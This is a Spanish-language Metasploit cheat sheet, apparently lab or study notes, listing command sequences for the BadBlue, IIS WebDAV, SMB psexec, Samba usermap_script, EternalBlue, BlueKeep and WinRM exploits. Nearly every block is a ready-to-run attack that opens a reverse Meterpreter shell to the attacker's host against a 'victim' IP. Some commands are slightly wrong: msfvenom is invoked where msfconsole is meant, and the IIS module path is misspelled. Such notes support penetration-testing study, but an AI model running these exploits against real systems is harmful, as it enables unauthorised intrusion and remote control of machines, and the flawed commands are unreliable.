# Exploit con Metasploit

Tags: #Metasploit #WebDav #BadBlue #SMB #BlueKeep #Samba #EternalBlue 

## HTTP 80

## BadBlue 2.7 

```bash 
# Usaremos el BufferOverFlow para entrar a la maquina victima con 'Meterpreter'
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search badblue 2.7                                    
	❯ use exploit/windows/http/badblue_passthru             # Usamos el exploit 
	❯ info
	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ set LHOST ens33                                       # Colocamos el puerto de nuestra maquina de atacante
	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el payload a usar 
	❯ options
	❯ exploit
```

## WebDAV

```bash 
# Si ya tenemos un archivo malicioso hecho en msfvenom listo para ejecutar en el servidor victima, podemos hacer lo siguiente y nos pondriamos en 'listening'
❯ msfvenom -q                  # q = Quitar el banner de inicio

	❯ use multi/handler                 
	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
	❯ options
	❯ set LHOST 192.168.68.1                     
	❯ set LPORT 1234
	❯ run
```

```bash 
# Nos proveera una sesion de Meterpreter en un Webdav
❯ msfvenom -q                     # q = Quitar el banner de inicio

	❯ search iis upload                                  # Buscamos el exploit a usar
	❯ use exploit/windows/iss/iss_webdav_upload_asp	   # Usamos el exploit
	❯ options
	❯ set LHOST 192.168.68.1                     
	❯ set LPORT 1234
	❯ set HttpUsername <user>                            # Debemos de colocar credenciales validas 
	❯ set HttpPassword <passwd>
	❯ set RHOSTS 192.168.1.194                           # Colocamos la IP de la maquina victima
	❯ set PATH /webdav/metasploit.asp                    # Colocamos la ruta y el nombre del archivo 
	❯ exploit
```

## Puerto 445 

## SMB

```bash 
# Usaremos el PsExec del puerto 135
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/smb/psexec               # Usamos el exploit
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ set SMBPass <passwd>
	❯ set SMBUser Administrator
	❯ exploit 
```

## Samba 

```bash 
# Algunas versiones de Samaba con exploit son: (3.0.20)
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search samba 
	❯ use exploit/multi/samba/usermap_script       # Usamos el exploit
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ set LHOST 192.168.1.157                     # Colocamos la IP de nuestra maquina 
	❯ exploit 
	❯ shell 
```

## EternalBlue (CVE-2017-0144)

```bash 
# Usaremos el EternalBlue SMBv1
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/smb/ms17_010_eternalblue      # Usamos el exploit
	❯ options
	❯ set payload windows/x64/meterpreter/reverse_tcp
	❯ set LHOST 192.168.1.157                          # Colocamos la IP de nuestra maquina 
	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
	❯ exploit 
```

## Puerto 3389 BlueKeep

* Servicio 'ms-wbt-server'

```bash 
# Usaremos el BlueKeep para el RDP, solo funciona en x64 de Windows 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce      # Usamos el exploit
	❯ options
	❯ set payload windows/x64/meterpreter/reverse_tcp
	❯ set LHOST 192.168.1.157   
	❯ set RHOSTS 192.168.1.194                                # Colocamos la IP de la maquina victima
	❯ show targets                                            # Nos muestra los diferentes targets
	❯ set target <windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)>  # Colocamos la arquitectura en donde se esta ejecutando la maquina victima 
	❯ exploit
```

## Puerto 5985-6 WinRM

```bash 
# Usaremos el WinRM 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/winrm/winrm_script_exec      # Usamos el exploit
	❯ options
	❯ set payload windows/x64/meterpreter/reverse_tcp
	❯ set LHOST 192.168.1.157                          # Colocamos la IP de nuestra maquina 
	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
	❯ set FORCE_VBS true                               
	❯ set USERNAME administrator
	❯ set PASSWORD <passwd>
	❯ exploit 
```